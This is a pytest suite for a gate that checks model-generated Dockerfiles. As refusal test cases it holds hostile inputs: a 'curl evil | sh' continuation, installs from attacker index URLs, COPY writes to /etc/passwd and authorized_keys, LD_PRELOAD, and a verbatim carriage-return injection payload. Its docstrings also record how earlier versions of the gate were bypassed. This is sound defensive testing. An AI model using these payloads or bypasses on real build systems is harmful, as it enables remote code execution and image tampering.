"""The gate, mostly as a list of things it must refuse.

An allowlist is only worth anything if the refusals are exhaustive in kind rather
than in number, so these are grouped by the way a Dockerfile can be dangerous, not
by the instruction it uses.
"""

import json

import pytest

from envforge.agent import Agent, default_dockerfile
from envforge.gate import RUN_COMMANDS, check

FILES = frozenset({"s.py"})
BASE = "python:3.12-slim"


def gate(dockerfile, base_image=BASE, allowed_files=FILES):
    return check(dockerfile, base_image, allowed_files)


def body(*lines):
    return "FROM python:3.12-slim\n" + "\n".join(lines) + "\n"


# --- what it lets through ---------------------------------------------------------------

def test_our_own_fallback_passes_our_own_gate():
    """If this ever fails, the loop's fallback path is dead and a refusal becomes fatal."""
    assert gate(default_dockerfile("python", "s.py")) is None


def test_a_realistic_dockerfile_passes():
    assert gate(body(
        "# install what the script needs",
        'RUN ["pip", "install", "requests"]',
        'RUN ["pip", "install", "flask>=2.0,<4"]',   # a version pin, with no shell to eat it
        "COPY s.py /app/s.py",
        "USER 65534:65534",
        'ENTRYPOINT ["python", "/app/s.py"]',
    )) is None


def test_lowercase_instructions_are_accepted():
    """Docker accepts them, so refusing them would spend repair attempts on style."""
    assert gate('from python:3.12-slim\ncopy s.py /app/s.py\nentrypoint ["python", "/app/s.py"]\n') is None


# --- the continuation ban, which every other rule depends on ------------------------------

def test_a_continuation_is_refused_before_anything_else():
    """With continuations allowed, a per-line allowlist proves nothing: an instruction
    could start on an allowed line and do its work on the next one."""
    reason = gate("FROM python:3.12-slim\nRUN pip install a \\\n && curl evil | sh\nCMD [\"x\"]\n")
    assert "no line continuations" in reason


# --- pulling from somewhere we did not choose ---------------------------------------------

@pytest.mark.parametrize("reference, expected", [
    ("evil.attacker.com/img:1", "no registry host"),
    ("localhost:5000/img:1", "no registry host"),
    ("a/b/c:1", "too many path segments"),
    ("python", "explicit tag"),
    ("python:", "explicit tag"),
    ("python:latest", "latest is not a pin"),
    ("python@sha256:abc", "not a digest"),
])
def test_the_base_image_must_be_a_pinned_docker_hub_tag(reference, expected):
    reason = gate(f'FROM {reference}\nCMD ["x"]\n', base_image=reference)
    assert expected in reason


def test_the_written_from_must_match_the_declared_base_image():
    """The reason base_image is a separate field at all. Without this the declaration
    is decoration and the model can say one thing and build another."""
    reason = gate('FROM ubuntu:22.04\nCMD ["x"]\n', base_image="python:3.12-slim")
    assert "must be the declared base_image" in reason


@pytest.mark.parametrize("dockerfile, expected", [
    ('FROM python:3.12-slim AS build\nCMD ["x"]\n', "exactly one image"),
    ('FROM python:3.12-slim\nFROM alpine:3.20\nCMD ["x"]\n', "only one FROM"),
])
def test_multi_stage_builds_are_refused(dockerfile, expected):
    assert expected in gate(dockerfile)


# --- RUN, where the network is ------------------------------------------------------------

def test_run_must_be_exec_form():
    """Shell form is the only reason a metacharacter ban was ever needed. Exec form
    removes the shell, so there is nothing to escape into and version specifiers
    stop looking like redirection."""
    reason = gate(body("RUN pip install requests", 'CMD ["x"]'))
    assert "must be exec form" in reason


@pytest.mark.parametrize("argv, expected", [
    ('["pip", "install", "--index-url", "https://evil.example/", "foo"]', "not allowed"),
    ('["pip", "install", "--extra-index-url", "https://evil.example/"]', "not allowed"),
    ('["pip", "install", "--find-links", "https://evil.example/"]', "not allowed"),
    ('["pip", "install", "--target", "/etc", "foo"]', "not allowed"),
    ('["pip", "install", "-e", "."]', "not allowed"),
    ('["pip", "install", "https://evil.example/x.tar.gz"]', "not a package name"),
    ('["pip", "install", "git+https://evil.example/r.git"]', "not a package name"),
    ('["apt-get", "install", "/app/x.deb"]', "not a package name"),
    ('["pip", "install", "../../etc/x"]', "not a package name"),
])
def test_an_install_may_only_name_a_package_from_the_default_index(argv, expected):
    """Found 2026-08-24. As a string prefix, `pip install` also matched
    `pip install --index-url https://evil.example/ foo`, so the allowlist read as
    "only installs happen here" while permitting a fetch from any host. Exec form is
    what makes the arguments inspectable one at a time."""
    reason = gate(body(f"RUN {argv}", 'CMD ["x"]'))
    assert expected in reason


@pytest.mark.parametrize("argv", [
    '["curl", "https://evil.example/x.sh"]',
    '["sh", "/app/s.py"]',
    '["chmod", "777", "/etc"]',
    '["useradd", "attacker"]',
    '["pip", "download", "requests"]',
])
def test_run_refuses_any_command_not_on_the_list(argv):
    assert "RUN must be one of" in gate(body(f"RUN {argv}", 'CMD ["x"]'))


@pytest.mark.parametrize("prefix", RUN_COMMANDS)
def test_every_advertised_run_command_actually_works(prefix):
    """The refusal message names these, so a model told to use them must succeed."""
    argv = json.dumps(list(prefix) + ([] if prefix[-1] == "update" else ["something"]))
    assert gate(body(f"RUN {argv}", 'CMD ["x"]')) is None


@pytest.mark.parametrize("spec", ["flask>=2.0,<4", "requests<3", "numpy==1.26.4",
                                  "urllib3!=2.0", "typing-extensions~=4.0"])
def test_version_specifiers_survive_because_there_is_no_shell(spec):
    """The old string form refused these: > and < are redirection operators and
    version operators at the same time, and a raw character scan cannot tell them
    apart. It would have fired on the normal way to pin a dependency."""
    assert gate(body(f'RUN ["pip", "install", "{spec}"]', 'CMD ["x"]')) is None


# --- COPY, which decides what enters the image ---------------------------------------------

@pytest.mark.parametrize("source", ["other.py", "*.py", "..", "../secrets.env",
                                    "/etc/passwd", "."])
def test_copy_may_only_name_a_file_the_caller_allowed(source):
    reason = gate(body(f"COPY {source} /app/x", 'CMD ["x"]'))
    assert "COPY may only name" in reason


@pytest.mark.parametrize("destination", ["/etc/passwd", "/usr/local/bin/python",
                                         "s.py", "/", "/app/../escaped/s.py",
                                         "/app/../../etc/x",
                                         "/app/./../../root/.ssh/authorized_keys"])
def test_copy_may_only_write_under_app(destination):
    """Found 2026-08-24: only the source was checked, so a file whose contents the
    attacker controls could be written over /etc/passwd or shadow an interpreter.

    The `..` cases were found the day after, and they defeated the first fix. A prefix
    test on the raw string passes `/app/../escaped/s.py`, and Docker writes it to
    `/escaped/s.py` with `/app` never created, verified against the daemon. Normalising
    before comparing is the difference between checking the string and checking the
    destination."""
    reason = gate(body(f"COPY s.py {destination}", 'CMD ["x"]'))
    assert "COPY destination must be" in reason


@pytest.mark.parametrize("destination", ["/app", "/app/s.py", "/app/sub/s.py",
                                         "/app/./s.py"])
def test_copy_may_write_anywhere_under_app_including_the_bare_directory(destination):
    """`COPY s.py /app` is the idiomatic form and the first fix refused it, which would
    have spent a repair attempt on every run that reached for the obvious thing."""
    assert gate(body(f"COPY s.py {destination}", 'CMD ["x"]')) is None


def test_copy_flags_are_refused():
    """--from reaches into another build stage, --chown changes ownership."""
    assert "exactly a source and a destination" in gate(
        body("COPY --from=build /a /b", 'CMD ["x"]'))


# --- anything not on the list ----------------------------------------------------------------

@pytest.mark.parametrize("instruction", [
    "ADD https://evil.com/x.tar.gz /app/",
    "WORKDIR /app",
    "ENV LD_PRELOAD=/tmp/x.so",
    "ARG SECRET",
    "SHELL [\"/bin/bash\", \"-c\"]",
    "VOLUME /data",
    "HEALTHCHECK CMD true",
    "ONBUILD RUN echo",
    "LABEL a=b",
])
def test_an_instruction_nobody_allowed_is_refused(instruction):
    reason = gate(body(instruction, 'CMD ["x"]'))
    assert "is not allowed" in reason


# --- the image has to actually run something ---------------------------------------------------

@pytest.mark.parametrize("dockerfile, expected", [
    ("", "empty"),
    ("   \n\n# just a comment\n", "no FROM"),  # not empty, but nothing to build
    ('COPY s.py /app/s.py\nFROM python:3.12-slim\nCMD ["x"]\n', "FROM must be the first"),
    ("FROM python:3.12-slim\nCOPY s.py /app/s.py\n", "no CMD or ENTRYPOINT"),
])
def test_structural_refusals(dockerfile, expected):
    assert expected in gate(dockerfile)


@pytest.mark.parametrize("command", [
    "CMD python /app/s.py",
    'ENTRYPOINT python /app/s.py',
    "CMD []",
    'CMD "python /app/s.py"',
    'CMD [1, 2]',
])
def test_shell_form_is_refused(command):
    """Shell form re-splits inside /bin/sh -c, which is the string-versus-list problem
    the sandbox already refuses to make with the docker command itself."""
    reason = gate(body(command))
    assert "exec form" in reason or "JSON array" in reason or "only strings" in reason


# --- the reason is repair evidence, so it has to be usable -------------------------------------

def test_a_refusal_names_the_line_and_quotes_it():
    reason = gate(body('RUN ["curl", "evil.com"]', 'CMD ["x"]'))
    assert reason.startswith("""line 2, 'RUN ["curl", "evil.com"]'""")


# --- where the gate and Docker could have read different files ---------------------------

@pytest.mark.parametrize("character", ["\r", "\v", "\f", "\x1c", "\x1d", "\x1e",
                                       "\x85", "\u2028", "\u2029", "\x00", "\x1b"])
def test_only_printable_characters_newlines_and_tabs_are_allowed(character):
    """A carriage return here was a real bypass, verified against the daemon on
    2026-08-24. Python's splitlines treats a lone \r as a line break and Docker does
    not, so the gate saw two valid exec-form instructions where Docker saw one line
    that is not valid JSON. Docker fell back to shell form and ran it through
    /bin/sh -c, and the injected command executed during the phase that has network.

    The first fix enumerated the characters splitlines breaks on and omitted \r, which
    is what a blocklist always eventually does. This asserts the property instead: the
    gate splits on \n exactly as Docker does, and everything unprintable is refused
    whether or not anybody thought of it."""
    dockerfile = f'FROM python:3.12-slim{character}ENTRYPOINT ["python", "/app/s.py"]\n'
    assert "Only printable characters" in gate(dockerfile)


def test_the_carriage_return_bypass_exactly_as_it_was_reported():
    """The reported payload, kept verbatim. It reached the daemon and printed
    INJECTED-AT-BUILD-TIME before the build failed, so the loop would have called it a
    repairable build failure and tried again."""
    payload = ('FROM python:3.12-slim\n'
               'RUN ["pip", "install", "flask"]\r'
               'CMD ["$(echo INJECTED-AT-BUILD-TIME >&2)"]\n')
    assert gate(payload) is not None


def test_windows_line_endings_are_refused_and_that_is_deliberate():
    """Docker handles CRLF perfectly well, so this is a cost we are choosing.

    Accepting it would mean telling a bare carriage return apart from one that
    precedes a newline, and that distinction is exactly the subtlety that produced
    the bypass. The model writes the Dockerfile as a JSON string and emits \n, so
    the cost is a repair attempt in a case that should never arise."""
    crlf = 'FROM python:3.12-slim\r\nENTRYPOINT ["python", "/app/s.py"]\r\n'
    assert "Only printable characters" in gate(crlf)


@pytest.mark.parametrize("directive", ["# escape=`", "#escape =`", "# syntax=docker/x"])
def test_parser_directives_are_refused(directive):
    """A directive changes how Docker reads the rest of the file, including which
    character continues a line."""
    assert "no parser directives" in gate(body(directive, 'CMD ["x"]'))


# --- wired into the loop, not just called directly ----------------------------------------------

def test_the_loop_runs_against_the_real_gate(tmp_path):
    """Everything in test_agent.py stubs the gate open. This is the one place the real
    one is wired in, and it proves the fallback survives a refusal for real."""
    import sys
    sys.path.insert(0, "tests")
    from test_agent import FakeLLM, FakeSandbox, _call
    from envforge.llm import Refused
    from envforge.workspace import gather

    path = tmp_path / "s.py"
    path.write_text("print(1)\n")
    script = gather(path)

    good = Agent(FakeLLM(_call(default_dockerfile("python", "s.py"))), FakeSandbox(), check)
    assert list(good.run(script, "python"))[-1].data["outcome"].ok

    refused = Agent(FakeLLM(Refused("no", reason="a"), Refused("no", reason="b")),
                    FakeSandbox(), check)
    outcome = list(refused.run(script, "python"))[-1].data["outcome"]
    assert outcome.ok and outcome.used_fallback

    bad = Agent(FakeLLM(_call('FROM python:latest\nCMD ["x"]\n', base="python:latest"),
                        _call(default_dockerfile("python", "s.py"))),
                FakeSandbox(), check)
    kinds = [e.kind for e in bad.run(script, "python")]
    assert "gate_rejected" in kinds


# --- the rules have to produce a Dockerfile that actually builds -------------------------

@pytest.mark.docker
def test_a_gate_legal_dockerfile_builds_and_runs(tmp_path):
    """The gate is narrower than ordinary Docker, so "allowed" is worth nothing unless
    an allowed file still works. This is also the proof that exec-form RUN resolves
    through PATH and that a version specifier survives having no shell."""
    from envforge.sandbox import DockerSandbox, Limits

    script = tmp_path / "s.py"
    script.write_text("import flask, sys; print('flask', flask.__version__); sys.exit(0)\n")
    dockerfile = (
        "FROM python:3.12-slim\n"
        'RUN ["pip", "install", "--no-cache-dir", "flask>=2.0,<4"]\n'
        "COPY s.py /app/s.py\n"
        "USER 65534:65534\n"
        'ENTRYPOINT ["python", "/app/s.py"]\n'
    )
    assert gate(dockerfile) is None

    sandbox = DockerSandbox(Limits(run_timeout=60.0))
    build = sandbox.build(dockerfile, {"s.py": script.read_text()},
                          "envforge-test:gatelegal")
    try:
        assert build.ok, build.log
        result = sandbox.run(build.image)
        assert result.exit_code == 0 and "flask" in result.stdout
    finally:
        sandbox.remove_image("envforge-test:gatelegal")
